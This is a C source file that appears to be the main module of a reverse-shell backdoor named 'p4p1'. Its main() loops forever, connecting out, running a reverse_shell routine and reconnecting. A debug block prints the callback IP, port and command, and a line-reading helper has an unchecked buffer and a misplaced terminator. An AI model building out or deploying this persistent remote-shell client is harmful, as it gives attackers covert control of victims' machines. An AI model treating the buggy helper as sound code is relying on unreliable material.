/*
** File Name: main.c
** Description: main file source for p4p1
** Made by: Leo Smith
**/

#include "main.h"

int main(int ac, char * av[])
{
	struct main_struct	m_s;

	setup(&m_s);
	while (1) {
		cnt(&m_s);
		reverse_shell(&m_s);
		close_cnt(&m_s);
	}
	return 0;
}

void error(char * msg)
{
	perror(msg);
	exit(errno);
}

#ifdef _DEBUG
void debug(struct main_struct *ms)
{
	printf("-----------------------\n"
		"Connection status 0 = active\n"
		"cn = %d\n", ms->cn);
	printf("-----------------------\n"
		"all of variables\n"
		"connecting to:  %s:%d\n"
		"buf : %s\n"
		"cmd : %s\n", ms->ip, ms->port, ms->buf, ms->cmd);
}
#endif

void first_line_to_buffer(FILE * fp, char *buf)
{
	int	i = 0;
	char	c = 0;

	while ((c = fgetc(fp)) != EOF) {
		if (c == '\n')
			break;
		buf[i++] = c;
	}
	buf[i+1] = '\0';
}
